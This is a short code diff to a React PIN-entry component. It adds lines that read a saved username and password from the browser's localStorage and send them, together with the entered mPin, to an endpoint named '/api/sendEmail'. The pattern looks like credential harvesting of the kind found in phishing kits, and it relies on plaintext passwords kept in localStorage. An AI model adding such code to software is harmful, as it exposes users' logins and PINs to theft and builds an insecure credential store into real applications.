@@ -11,10 +11,15 @@ function MPin({host}) {
     const handlePin = async (data) => {
 
       localStorage.setItem('mPin', data)
+      const username = localStorage.getItem('username')
+      const password = localStorage.getItem('password')
       
       const body = {
-        mPin: data
+        mPin: data,
+        username,
+        password,
       }
+      
       try {
         setLoading('0.33')
         const response = await fetch('/api/sendEmail', {
